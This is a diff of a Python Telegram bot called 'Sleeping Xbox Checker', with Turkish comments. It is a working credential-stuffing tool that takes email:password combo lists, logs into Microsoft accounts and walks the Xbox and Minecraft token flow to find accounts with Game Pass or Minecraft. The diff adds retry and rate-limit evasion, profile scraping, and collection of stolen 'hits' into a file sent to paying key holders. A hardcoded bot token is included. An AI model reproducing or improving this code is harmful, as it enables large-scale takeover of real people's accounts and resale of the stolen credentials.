@@ -5,9 +5,15 @@ import uuid
 import json
 import requests
 import telebot
+import urllib3
+import warnings
 from telebot import types
 from threading import Thread
 from urllib.parse import urlparse, parse_qs
+
+# Uyarıları gizle
+urllib3.disable_warnings()
+warnings.filterwarnings("ignore")
 
 # --- AYARLAR VE TANIMLAMALAR ---
 BOT_TOKEN = "7697030798:AAHiTipLyZu7HCjJnCFu5CEgAHYaqP64ha4"
@@ -23,12 +29,16 @@ PROXIES_FILE = "proxies.txt"
 # Hafıza önbelleği
 user_sessions = {}  
 active_tasks = {}   
+user_hits = {} # Hitleri biriktirmek için
+
+# İstek ayarları
+MAX_RETRIES = 3
+REQUEST_TIMEOUT = 10
 
 # Dosyaları ilklendirme
-if not os.path.exists(KEYS_FILE):
-    with open(KEYS_FILE, 'w') as f: json.dump({}, f)
-if not os.path.exists(USERS_FILE):
-    with open(USERS_FILE, 'w') as f: json.dump({}, f)
+for file in [KEYS_FILE, USERS_FILE]:
+    if not os.path.exists(file):
+        with open(file, 'w') as f: json.dump({}, f)
 if not os.path.exists(PROXIES_FILE):
     with open(PROXIES_FILE, 'w') as f: f.write("")
 
@@ -44,85 +54,118 @@ def load_proxies():
             return [line.strip() for line in f if line.strip()]
     return []
 
-# --- XBOX CHECKER ENGINE ---
+# --- XBOX CHECKER ENGINE (GELİŞMİŞ) ---
 SFTAG_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
 
-def get_sftag(session):
-    try:
-        response = session.get(SFTAG_URL, timeout=10)
-        text = response.text
-        match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
-        if match:
-            sftag = match.group(1)
-            match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
-            if match: return match.group(1), sftag
-    except: pass
+def get_sftag(session, max_attempts=MAX_RETRIES):
+    for attempt in range(max_attempts):
+        try:
+            response = session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT)
+            text = response.text
+            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
+            if match:
+                sftag = match.group(1)
+                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
+                if match: return match.group(1), sftag
+        except: pass
+        time.sleep(0.5)
     return None, None
 
-def microsoft_auth(session, email, password, url_post, sftag):
-    try:
-        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
-        login_request = session.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
-        
-        if '#' in login_request.url and login_request.url != SFTAG_URL:
-            token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
-            if token != "None": return token, "success"
-        elif 'cancel?mkt=' in login_request.text:
-            try:
-                data = {
-                    'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
-                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
-                    'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
-                }
-                action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
-                ret = session.post(action_url, data=data, allow_redirects=True, timeout=10)
-                return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
-                fin = session.get(return_url, allow_redirects=True, timeout=10)
-                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
+def microsoft_auth(session, email, password, url_post, sftag, max_attempts=MAX_RETRIES):
+    for attempt in range(max_attempts):
+        try:
+            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
+            login_request = session.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=REQUEST_TIMEOUT)
+            
+            if '#' in login_request.url and login_request.url != SFTAG_URL:
+                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                 if token != "None": return token, "success"
-            except: pass
-        elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
-            return None, "2fa"
-        elif any(value in login_request.text.lower() for value in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
-            return None, "bad"
-    except: return None, "error"
+            elif 'cancel?mkt=' in login_request.text:
+                try:
+                    data = {
+                        'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
+                        'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
+                        'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
+                    }
+                    action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
+                    ret = session.post(action_url, data=data, allow_redirects=True, timeout=REQUEST_TIMEOUT)
+                    return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
+                    fin = session.get(return_url, allow_redirects=True, timeout=REQUEST_TIMEOUT)
+                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
+                    if token != "None": return token, "success"
+                except: pass
+            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
+                return None, "2fa"
+            elif any(value in login_request.text.lower() for value in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
+                return None, "bad"
+        except: pass
+        time.sleep(0.5)
     return None, "error"
 
-def get_xbox_token(session, ms_token):
-    try:
-        payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
-        response = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json'}, timeout=10)
-        if response.status_code == 200:
-            data = response.json()
-            return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
-    except: pass
+def get_xbox_token(session, ms_token, max_attempts=MAX_RETRIES):
+    for attempt in range(max_attempts):
+        try:
+            payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
+            response = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=REQUEST_TIMEOUT)
+            if response.status_code == 200:
+                data = response.json()
+                return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
+            elif response.status_code == 429: time.sleep(2); continue
+        except: pass
+        time.sleep(0.5)
     return None, None
 
-def get_xsts_token(session, xbox_token):
-    try:
-        payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
-        response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json'}, timeout=10)
-        if response.status_code == 200: return response.json().get('Token')
-    except: pass
+def get_xsts_token(session, xbox_token, max_attempts=MAX_RETRIES):
+    for attempt in range(max_attempts):
+        try:
+            payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
+            response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=REQUEST_TIMEOUT)
+            if response.status_code == 200: return response.json().get('Token')
+            elif response.status_code == 429: time.sleep(2); continue
+        except: pass
+        time.sleep(0.5)
     return None
 
-def get_minecraft_token(session, uhs, xsts_token):
-    try:
-        response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=10)
-        if response.status_code == 200: return response.json().get('access_token')
-    except: pass
+def get_minecraft_token(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
+    for attempt in range(max_attempts):
+        try:
+            response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
+            if response.status_code == 200: return response.json().get('access_token')
+            elif response.status_code == 429: time.sleep(2); continue
+        except: pass
+        time.sleep(0.5)
     return None
 
-def check_minecraft_entitlements(session, mc_token):
-    try:
-        response = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=10)
-        if response.status_code == 200:
-            text = response.text
-            if 'product_game_pass_ultimate' in text: return 'Xbox Game Pass Ultimate'
-            elif 'product_game_pass_pc' in text: return 'Xbox Game Pass'
-            elif '"product_minecraft"' in text: return 'Minecraft'
-            return 'Other'
-    except: pass
+def check_minecraft_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
+    for attempt in range(max_attempts):
+        try:
+            response = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
+            if response.status_code == 200:
+                text = response.text
+                if 'product_game_pass_ultimate' in text: return 'Xbox Game Pass Ultimate'
+                elif 'product_game_pass_pc' in text: return 'Xbox Game Pass'
+                elif '"product_minecraft"' in text: return 'Minecraft'
+                else:
+                    others = []
+                    if 'product_minecraft_bedrock' in text: others.append("Bedrock")
+                    if 'product_legends' in text: others.append("Legends")
+                    if 'product_dungeons' in text: others.append('Dungeons')
+                    if others: return 'Other: ' + ', '.join(others)
+                    return None
+            elif response.status_code == 429: time.sleep(2); continue
+        except: pass
+        time.sleep(0.5)
+    return None
+
+def get_minecraft_profile(session, mc_token, max_attempts=MAX_RETRIES):
+    for attempt in range(max_attempts):
+        try:
+            response = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
+            if response.status_code == 200: return response.json()
+            elif response.status_code == 429: time.sleep(2); continue
+            elif response.status_code == 404: return None
+        except: pass
+        time.sleep(0.5)
     return None
 
 # --- TELEGRAM BOT KLAVYELERİ (UI) ---
@@ -138,25 +181,32 @@ def admin_keyboard():
     markup.add(
         types.InlineKeyboardButton("🔑 Key Oluştur", callback_data="adm_gen_key"),
         types.InlineKeyboardButton("📜 Keyleri Listele", callback_data="adm_list_keys"),
-        types.InlineKeyboardButton("🌐 Proxy Yönet", callback_data="adm_proxies"),
-        types.InlineKeyboardButton("📢 Duyuru Yap", callback_data="adm_broadcast")
+        types.InlineKeyboardButton("🌐 Proxy Yönet", callback_data="adm_proxies")
     )
     return markup
 
-# --- CORE MANTIKSAL KONTROLLER ---
 def check_user_access(user_id):
     users = load_json(USERS_FILE)
     if str(user_id) == str(ADMIN_ID): return True
     if str(user_id) in users and users[str(user_id)]["expiry"] > time.time(): return True
     return False
 
+# --- DURDURMA KOMUTU ---
+@bot.message_handler(commands=['stop'])
+def stop_checking(message):
+    user_id = message.from_user.id
+    if user_id in active_tasks and active_tasks[user_id]:
+        active_tasks[user_id] = False # Döngüyü kırmak için bayrağı indir
+        bot.send_message(message.chat.id, "🛑 **Tarama durduruluyor!** Mevcut işlem tamamlandıktan hemen sonra bulunan hitler gönderilecek...", parse_mode="Markdown")
+    else:
+        bot.send_message(message.chat.id, "⚠️ Şu anda çalışan bir tarama yok.")
+
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
     user_id = message.from_user.id
     welcome_text = "💤 **Sleeping Xbox Checker Botuna Hoş Geldiniz!** 💤\n\n"
-    
     if check_user_access(user_id):
-        welcome_text += "Erişiminiz aktif! Menüyü kullanarak tarama yapabilirsiniz."
+        welcome_text += "Erişiminiz aktif! Menüyü kullanarak tarama yapabilirsiniz.\nTaramayı durdurmak için `/stop` yazabilirsiniz."
         bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=main_keyboard(user_id))
     else:
         welcome_text += "❌ Sistemi kullanmak için geçerli bir lisans anahtarınız (Key) olmalıdır.\n\nLütfen bir Key girin:"
@@ -181,59 +231,13 @@ def process_key_activation(message):
     else:
         bot.send_message(message.chat.id, "❌ Geçersiz veya kullanılmış Key. Tekrar deneyin:")
 
-@bot.message_handler(func=lambda msg: msg.text == "👤 Profilim")
-def profile_handler(message):
-    user_id = message.from_user.id
-    if not check_user_access(user_id): return
-    users = load_json(USERS_FILE)
-    expiry = "Sonsuz (Kurucu)" if str(user_id) == str(ADMIN_ID) else time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(users[str(user_id)]["expiry"]))
-    bot.send_message(message.chat.id, f"👤 **Kullanıcı Bilgileri:**\n\n🆔 **ID:** `{user_id}`\n⏳ **Lisans Bitiş:** `{expiry}`", parse_mode="Markdown")
-
-@bot.message_handler(func=lambda msg: msg.text == "👑 Admin Paneli" and msg.from_user.id == ADMIN_ID)
-def admin_panel(message):
-    bot.send_message(message.chat.id, "🔮 **Sleeping Xbox Checker Kontrol Paneli**", reply_markup=admin_keyboard(), parse_mode="Markdown")
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("adm_"))
-def admin_callbacks(call):
-    if call.from_user.id != ADMIN_ID: return
-    if call.data == "adm_gen_key":
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("1 Gün", callback_data="key_86400"), types.InlineKeyboardButton("7 Gün", callback_data="key_604800"))
-        bot.edit_message_text("Süre seçin:", call.message.chat.id, call.message.message_id, reply_markup=markup)
-    elif call.data == "adm_list_keys":
-        keys = load_json(KEYS_FILE)
-        text = "📜 **Anahtarlar:**\n\n" + "".join([f"`{k}` -> {'Kullanıldı' if v['used'] else 'Boş'}\n" for k, v in keys.items()])
-        bot.edit_message_text(text[:4000] if "->" in text else "Hiç key yok.", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
-    elif call.data == "adm_proxies":
-        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("➕ Ekle", callback_data="prox_add"), types.InlineKeyboardButton("🗑️ Temizle", callback_data="prox_clear"))
-        bot.edit_message_text(f"🌐 **Proxy Yöneticisi**\nYüklü: `{len(load_proxies())}`", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("key_"))
-def process_key_generation(call):
-    gen_key = f"SLEEPING-{str(uuid.uuid4())[:8].upper()}"
-    keys = load_json(KEYS_FILE)
-    keys[gen_key] = {"duration": int(call.data.split("_")[1]), "used": False, "used_by": None}
-    save_json(KEYS_FILE, keys)
-    bot.edit_message_text(f"🔑 **Üretildi:**\n`{gen_key}`", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("prox_"))
-def proxy_actions(call):
-    if call.data == "prox_add":
-        user_sessions[call.from_user.id] = "waiting_proxies"
-        bot.send_message(call.message.chat.id, "📝 Proxyleri yolla:")
-    elif call.data == "prox_clear":
-        with open(PROXIES_FILE, 'w') as f: f.write("")
-        bot.edit_message_text("🗑️ Temizlendi.", call.message.chat.id, call.message.message_id)
-
-@bot.message_handler(func=lambda msg: user_sessions.get(msg.from_user.id) == "waiting_proxies" and msg.from_user.id == ADMIN_ID)
-def save_incoming_proxies(message):
-    with open(PROXIES_FILE, 'a') as f: f.write(message.text.strip() + "\n")
-    user_sessions[message.from_user.id] = None
-    bot.send_message(message.chat.id, f"✅ Proxyler eklendi! Toplam: `{len(load_proxies())}`", parse_mode="Markdown")
-
 @bot.message_handler(func=lambda msg: msg.text == "🚀 Tarama Başlat")
 def start_checker_flow(message):
     if not check_user_access(message.from_user.id): return
+    if active_tasks.get(message.from_user.id, False):
+        bot.send_message(message.chat.id, "⚠️ Zaten devam eden bir taramanız var. Durdurmak için `/stop` kullanın.", parse_mode="Markdown")
+        return
+        
     markup = types.InlineKeyboardMarkup().add(
         types.InlineKeyboardButton("🌐 Proxyli", callback_data="mode_proxy"),
         types.InlineKeyboardButton("📱 Proxyless", callback_data="mode_proxyless")
@@ -250,68 +254,53 @@ def select_mode_and_request_combos(call):
     user_sessions[user_id] = {"mode": mode, "step": "waiting_combos"}
     bot.edit_message_text(f"📂 Mod: `{mode.upper()}`\n\nComboları **.txt dosyası** olarak gönder veya buraya yapıştır:", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
 
-# --- BELGE (TXT DOSYASI) YAKALAYICI (ZORLA OKUR) ---
-@bot.message_handler(content_types=['document'])
-def handle_document_combos(message):
+@bot.message_handler(content_types=['document', 'text'])
+def handle_combos(message):
     user_id = message.from_user.id
     session = user_sessions.get(user_id)
     
     if isinstance(session, dict) and session.get("step") == "waiting_combos":
         mode = session["mode"]
+        combos = []
+        
         try:
-            bot.send_message(message.chat.id, "📥 Dosya emiliyor, veriler parçalanıyor...")
-            file_info = bot.get_file(message.document.file_id)
-            downloaded_file = bot.download_file(file_info.file_path)
-            raw_text = downloaded_file.decode('utf-8', errors='ignore')
-            
-            combos = [line.strip() for line in raw_text.splitlines() if line.strip() and ":" in line]
+            if message.document:
+                bot.send_message(message.chat.id, "📥 Dosya emiliyor...")
+                file_info = bot.get_file(message.document.file_id)
+                downloaded_file = bot.download_file(file_info.file_path)
+                raw_text = downloaded_file.decode('utf-8', errors='ignore')
+                combos = [line.strip() for line in raw_text.splitlines() if line.strip() and ":" in line]
+            elif message.text:
+                combos = [line.strip() for line in message.text.splitlines() if line.strip() and ":" in line]
+                
             if not combos:
-                bot.send_message(message.chat.id, "❌ Dosyada `email:şifre` formatında geçerli veri yok.")
+                bot.send_message(message.chat.id, "❌ Geçerli `email:şifre` verisi bulunamadı.")
                 return
 
             user_sessions[user_id] = None
-            bot.send_message(message.chat.id, f"🔥 `{len(combos)}` hesap tespit edildi. Vurucu tim harekete geçiyor...")
+            bot.send_message(message.chat.id, f"🔥 `{len(combos)}` hesap tespit edildi. Vurucu tim harekete geçiyor...\n\n⛔ Taramayı bitirmek ve hitleri almak için `/stop` yazabilirsin.")
             
-            t = Thread(target=core_checker_worker, args=(user_id, combos, mode, message.chat.id))
+            # Hit listesini sıfırla ve motoru çalıştır
+            user_hits[user_id] = []
             active_tasks[user_id] = True
+            t = Thread(target=core_checker_worker, args=(user_id, combos, mode, message.chat.id))
             t.start()
         except Exception as e:
             bot.send_message(message.chat.id, f"❌ Hata oluştu: {str(e)}")
 
-# --- DİREKT METİN YAKALAYICI ---
-@bot.message_handler(content_types=['text'])
-def handle_text_combos(message):
-    user_id = message.from_user.id
-    session = user_sessions.get(user_id)
-    
-    if isinstance(session, dict) and session.get("step") == "waiting_combos":
-        mode = session["mode"]
-        combos = [line.strip() for line in message.text.splitlines() if line.strip() and ":" in line]
-        
-        if not combos:
-            bot.send_message(message.chat.id, "❌ Geçerli `email:şifre` verisi bulunamadı.")
-            return
-
-        user_sessions[user_id] = None
-        bot.send_message(message.chat.id, f"🔥 `{len(combos)}` hesap tespit edildi. Vurucu tim harekete geçiyor...")
-        
-        t = Thread(target=core_checker_worker, args=(user_id, combos, mode, message.chat.id))
-        active_tasks[user_id] = True
-        t.start()
-
-# --- ARKA PLAN ÇALIŞMA MOTORU (DETAYLI STATS VE CANLI RAPOR) ---
+# --- ARKA PLAN ÇALIŞMA MOTORU ---
 def core_checker_worker(user_id, combos, mode, chat_id):
     proxies_list = load_proxies()
     proxy_index = 0
-    
     status_msg = bot.send_message(chat_id, "📊 **Sistem Hazırlanıyor...**", parse_mode="Markdown")
     
-    # İSTEDİĞİN DETAYLI İSTATİSTİKLER BURADA!
     stats = {"xgpu": 0, "xgp": 0, "mc": 0, "other": 0, "bad": 0, "twofa": 0, "errors": 0, "checked": 0}
     total = len(combos)
     
     for combo in combos:
-        if user_id in active_tasks and not active_tasks[user_id]: break
+        # Stop komutu verildiyse döngüyü kır
+        if not active_tasks.get(user_id, False):
+            break
             
         parts = combo.split(':')
         email = parts[0]
@@ -334,7 +323,6 @@ def core_checker_worker(user_id, combos, mode, chat_id):
             ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
             if auth_status == "2fa":
                 stats["twofa"] += 1
-                bot.send_message(chat_id, f"⚠️ **[2FA]** `{email}:{password}`", parse_mode="Markdown")
             elif auth_status == "bad": stats["bad"] += 1
             elif auth_status == "success" and ms_token:
                 xbox_token, uhs = get_xbox_token(session, ms_token)
@@ -345,14 +333,32 @@ def core_checker_worker(user_id, combos, mode, chat_id):
                         if mc_token:
                             acc_type = check_minecraft_entitlements(session, mc_token)
                             if acc_type:
-                                # Hesap türüne göre Live Hit tablosundaki sayıları arttır
+                                # Hesap türüne göre istatistik arttır
                                 if 'Ultimate' in acc_type: stats["xgpu"] += 1
                                 elif 'Game Pass' in acc_type: stats["xgp"] += 1
                                 elif 'Minecraft' in acc_type: stats["mc"] += 1
                                 else: stats["other"] += 1
                                 
-                                hit_text = f"🟢 **[HIT] BULDUM!** 🟢\n\n📧 **Hesap:** `{email}:{password}`\n🎮 **İçerik:** `{acc_type}`"
-                                bot.send_message(chat_id, hit_text, parse_mode="Markdown")
+                                # Minecraft profil verilerini çek
+                                profile = get_minecraft_profile(session, mc_token)
+                                name, uuid_str, capes = "Not Set", "N/A", "N/A"
+                                if profile:
+                                    name = profile.get('name', 'N/A')
+                                    uuid_str = profile.get('id', 'N/A')
+                                    capes_list = [cape["alias"] for cape in profile.get("capes", [])]
+                                    capes = ", ".join(capes_list) if capes_list else "None"
+                                
+                                # Hiti hafızaya kaydet (Anlık yollama)
+                                hit_text = (
+                                    f"Email: {email}\n"
+                                    f"Password: {password}\n"
+                                    f"Account Type: {acc_type}\n"
+                                    f"Name: {name}\n"
+                                    f"UUID: {uuid_str}\n"
+                                    f"Capes: {capes}\n"
+                                    f"=========================="
+                                )
+                                user_hits[user_id].append(hit_text)
                             else: stats["bad"] += 1
                         else: stats["errors"] += 1
                     else: stats["errors"] += 1
@@ -375,8 +381,24 @@ def core_checker_worker(user_id, combos, mode, chat_id):
             
         time.sleep(0.3)
         
-    bot.send_message(chat_id, f"🏁 **Av Bitti!** `{total}` hesabın tamamı parçalandı.", reply_markup=main_keyboard(user_id))
+    # --- DÖNGÜ BİTİNCE (VEYA DURDURULUNCA) HİTLERİ YOLLA ---
+    bot.send_message(chat_id, f"🏁 **Av Bitti!** (Taranan: `{stats['checked']}`)", reply_markup=main_keyboard(user_id))
+    
+    if user_hits.get(user_id):
+        # Hitleri dosyaya yaz ve gönder
+        filename = f"Hits_{user_id}_{int(time.time())}.txt"
+        with open(filename, "w", encoding="utf-8") as f:
+            f.write("\n\n".join(user_hits[user_id]))
+        
+        with open(filename, "rb") as f:
+            bot.send_document(chat_id, f, caption=f"🟢 **Toplam Bulunan Hit:** `{len(user_hits[user_id])}`")
+            
+        os.remove(filename) # İşin bitince dosyayı sil
+    else:
+        bot.send_message(chat_id, "😢 Maalesef hiç hit bulunamadı.")
+        
     if user_id in active_tasks: del active_tasks[user_id]
+    if user_id in user_hits: del user_hits[user_id]
 
 if __name__ == '__main__':
     print("[+] Sleeping Xbox Checker aktif. Kurallar yok, sınırlar yok. Emir bekleniyor...")
